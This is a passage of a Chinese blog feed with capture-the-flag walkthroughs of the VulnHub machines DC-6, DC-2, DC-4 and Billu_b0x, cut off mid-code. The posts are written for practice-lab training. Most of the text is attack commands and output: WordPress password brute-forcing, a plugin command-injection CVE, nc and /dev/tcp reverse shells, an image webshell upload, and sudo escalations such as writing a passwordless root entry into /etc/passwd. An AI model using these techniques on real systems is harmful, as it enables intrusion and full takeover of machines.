(Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br></pre></td></tr></table></figure></p><p>至此无法打开网页<code>Did not follow redirect to http://wordy/</code><br>将其加入<code>hosts</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.67.147 wordy</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf503f9afb1743398.png" alt="10.png"><br>可以看出使用<code>WordPress</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wpscan --url http://wordy -e</span><br><span class="line">Users:admin、sarah、mark、jens、graham</span><br></pre></td></tr></table></figure></p><p>根据提示创建字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure></p><p>爆破密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# wpscan --url http://wordy -U user -P passwords.txt</span><br><span class="line">Username：mark</span><br><span class="line">Password：helpdesk01</span><br></pre></td></tr></table></figure></p><p>登录，发现可以安装插件<br><img src="https://i.loli.net/2019/06/03/5cf530eb5664491821.png" alt="11.png"></p><h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>利用<a href="https://github.com/aas-n/CVE/tree/master/CVE-2018-15877" target="_blank" rel="noopener">CVE-2018-15877</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf53cb3b3f7419327.png" alt="12.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 4444</span><br><span class="line">lanbainan.cn | nc 192.168.67.1 4444 -e /bin/bash</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$</span><br></pre></td></tr></table></figure></p><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/var/www/html/wp-admin$ cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class="line">cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">graham:x:1001:1001:Graham,,,:/home/graham:/bin/bash</span><br><span class="line">mark:x:1002:1002:Mark,,,:/home/mark:/bin/bash</span><br><span class="line">sarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bash</span><br><span class="line">jens:x:1004:1004:Jens,,,:/home/jens:/bin/bash</span><br></pre></td></tr></table></figure><p>继续在<code>home</code>目录下寻找线索<br>发现一个备份脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/home/jens$ cat backups.sh</span><br><span class="line">cat backups.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/04/5cf54555606a875921.png" alt="15.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf540677e0b033935.png" alt="13.png"><br>发现新用户<code>graham：GSo7isUM1D4</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:~$ sudo -l</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf541d24d98622667.png" alt="14.png"><br>能使用<code>jens</code>的身份运行<code>backups.sh</code>意味着我能成为<code>jens</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ echo &quot;/bin/sh&quot; &gt; backups.sh</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh</span><br><span class="line">$ id</span><br><span class="line">uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">jens@dc-6:~$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure><p>将使用<strong>Nmap提权</strong><br>低版本(2.02-5.21)可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ sudo nmap nmap --interactive+</span><br><span class="line">!sh</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><p>高版本，插件提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ echo &apos;os.execute(&quot;/bin/sh&quot;)&apos; &gt; TE.nse</span><br><span class="line">jens@dc-6:~$ sudo nmap --script=/home/jens/TE.nse</span><br><span class="line">#python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;    #尽管执行了命令但是不显示</span><br><span class="line">root@dc-6:/home/jens# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@dc-6:~# cat theflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/06/04/5cf54c5c298cf19134.png" alt="16.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;DC-5&quot;&gt;&lt;a href=&quot;#DC-5&quot; class=&quot;headerlink&quot; title=&quot;DC-5&quot;&gt;&lt;/a&gt;DC-5&lt;/h1&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：找到flag（提示随着页面刷新而改变的东西，没有涉及phpmailer漏洞）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/dc-5,314/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/dc-5,314/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对于DC-2和DC-4的测试</title>
    <link href="http://www.lanbainan.cn/2019/05/23/2019-05-23/"/>
    <id>http://www.lanbainan.cn/2019/05/23/2019-05-23/</id>
    <published>2019-05-23T09:49:00.000Z</published>
    <updated>2019-05-29T05:26:00.033Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>主机NET模式<br>实验目的：找到flag（5个flag）<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-2,311/</a><br><a id="more"></a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/23/5ce66bb238dd454686.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p1-65535 192.168.67.143</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br></pre></td></tr></table></figure></p><p>登录观察网页<br><img src="https://i.loli.net/2019/05/23/5ce66c7f58e3d51462.png" alt="2.png"><br>注：这里需要在host文件中添加<code>192.168.67.143 dc-2</code></p><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="https://i.loli.net/2019/05/23/5ce66dfe9aa8569460.png" alt="3.png"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>根据提示需要使用<a href="https://www.4hou.com/tools/14693.html" target="_blank" rel="noopener">cewl</a>，并且密码尽可能多,<code>cewl</code>是根据爬取网站内容的关键字生成一份字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cewl http://dc-2 -w /root/Desktop/passwd.txt</span><br><span class="line">Username：jerry，Password：adipiscing</span><br><span class="line">Username：tom，Password：parturient</span><br></pre></td></tr></table></figure></p><p>使用<code>jerry</code>登录<code>http://dc-2/wp-login.php</code><br><img src="https://i.loli.net/2019/05/24/5ce78742887f969239.png" alt="4.png"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>flag2提示可以使用WordPress，并且还有其他捷径<br>7744开着ssh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ ssh tom@192.168.67.143 -p 7744</span><br><span class="line">tom@DC-2:~$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C-2:~$ compgen -c #查看当前可以命令</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/29/5cee16fb2e9c949538.png" alt="6.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ less flag3.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/24/5ce78fc8d8f9592435.png" alt="7.png"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>提示关键词<code>jerry</code>和<code>su</code><br><img src="https://i.loli.net/2019/05/24/5ce78bffe706535795.png" alt="5.png"><br>熟悉的<code>rbash逃逸</code>,可以利用<code>vi编辑器</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line">/usr/bin:/home/tom/usr/bin</span><br><span class="line">$ export PATH=$PATH:/bin:/usr/bin</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su jerry</span><br><span class="line">jerry@DC-2:/home/tom$</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/24/5ce7954c50cc376445.png" alt="8.png"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>提示<code>git</code>,<br>小提示:<code>git</code>在帮助状态下通过可以通过<code>!/bin/bash进入</code>交互式shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p --help</span><br><span class="line">!/bin/bash</span><br><span class="line">root@DC-2:/home/jerry#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/24/5ce798c0bde5f91805.png" alt="9.png"></p><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><p>主机NET模式<br>实验目的：找到flag（1个flag，多个入口）<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-4,313/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-4,313/</a></p><h2 id="测试开始"><a href="#测试开始" class="headerlink" title="测试开始"></a>测试开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/27/5ceb493f64ce634899.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p1-65535 192.168.67.145</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br></pre></td></tr></table></figure></p><p>打开网页<br><img src="https://i.loli.net/2019/05/29/5cedd3a583b1568402.png" alt="12.png"><br>提示admin登录，使用burp爆破<br><img src="https://i.loli.net/2019/05/29/5cedd312294aa52635.png" alt="11.png"><br>登录后发现命令注入<br><img src="https://i.loli.net/2019/05/29/5ceddcaa7b7a912444.png" alt="13.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/29/5ceddff46b8a770115.png" alt="14.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">radio=nc -vlp 4444 -e /bin/bash&amp;submit=Run</span><br><span class="line">λ nc -nv 192.168.67.145 444</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">www-data@dc-4:/usr/share/nginx/html$</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/usr/share/nginx/html$ cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/29/5cedeace3e3e785099.png" alt="15.png"><br>四个用户<code>charles</code>、<code>jim</code>、<code>sam</code>、<code>root</code><br>在<code>jim</code>目录下发现<code>old-passwords.bak</code><br>爆破4个用户的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# hydra -L user -P old-passwords 192.168.67.145 ssh</span><br><span class="line">[22][ssh] host: 192.168.67.145   login: jim   password: jibril04</span><br></pre></td></tr></table></figure></p><p>root发给jim的<strong>一封信</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure></p><p>前往<code>/var/mail</code>寻找线索,发现一份<code>charles</code>给<code>jim</code>的信<br><code>charles</code>度假去了把密码给了<code>jim</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:charles</span><br><span class="line">password:^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure></p><p>当切换至<code>charles</code>时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p><p>发现<code>teehee</code>以root权限运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ echo &quot;EV::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd # -a附加到指定文件，不覆盖</span><br><span class="line">charles@dc-4:~$ su EV</span><br><span class="line">root@dc-4:/home/charles#</span><br></pre></td></tr></table></figure></p><h3 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@dc-4:/root# cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/29/5cee1570e7bdb60329.png" alt="16.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;DC-2&quot;&gt;&lt;a href=&quot;#DC-2&quot; class=&quot;headerlink&quot; title=&quot;DC-2&quot;&gt;&lt;/a&gt;DC-2&lt;/h1&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：找到flag（5个flag）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/dc-2,311/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对于Billu_b0x的测试</title>
    <link href="http://www.lanbainan.cn/2019/04/16/2019-04-16/"/>
    <id>http://www.lanbainan.cn/2019/04/16/2019-04-16/</id>
    <published>2019-04-16T05:30:00.000Z</published>
    <updated>2019-04-16T11:13:25.928Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>主机NET模式<br>实验目的：拿到root权限(提示从web应用入手)<br>项目地址：<a href="https://www.vulnhub.com/entry/billu-b0x,188/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/billu-b0x,188/</a><br><a id="more"></a></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb56b18305f1.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.67.138</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)</span><br><span class="line">|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)</span><br><span class="line">|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-title: --==[[IndiShell Lab]]==--</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57238c6f7f.png" alt="2.png"></p><h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>提示使用sql注入，第一时间想到post注入（技术不过关），但是无果<br>爆破目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.67.138 /usr/share/dirb/wordlists/big.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57306662f6.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.138/add #文件上传无回显</span><br><span class="line">http://192.168.67.138/in #phpinfo</span><br><span class="line">http://192.168.67.138/test #提示文件包含</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57706a2983.png" alt="4.png"><br>下载源码<br>get请求无果，post请求<br><img src="https://i.loli.net/2019/04/16/5cb577070a0ae.png" alt="5.png"><br>passwd中<code>ica</code>和<code>root</code>可以登录ssh<br>下载c.php发现mysql账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">billu</span><br><span class="line">b0x_billu</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57dd9d5e12.png" alt="6.png"><br>登录<code>http://192.168.67.138</code><br>发现一个新的上传点<br><img src="https://i.loli.net/2019/04/16/5cb57ed3b1439.png" alt="7.png"><br>检查文件内容改名无法达到目的，上传图片马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php 2.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb584d502842.png" alt="8.png"><br>进入<code>http://192.168.67.138/uploaded_images/</code><br>分析<code>panel.php</code>发现文件包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;continue&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$dir=getcwd();</span><br><span class="line">$choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]);</span><br><span class="line"></span><br><span class="line">if($choice===&apos;add&apos;)</span><br><span class="line">&#123;</span><br><span class="line">       include($dir.&apos;/&apos;.$choice.&apos;.php&apos;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        if($choice===&apos;show&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">include($dir.&apos;/&apos;.$choice.&apos;.php&apos;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5b133d3eab.png" alt="9.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>进行URL编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.67.1/4444 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5b13078bb5.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ id`</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a #查看内核版本</span><br><span class="line">cat /etc/issue #查看系统版本</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">本地提权exp</a><br>下载到本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 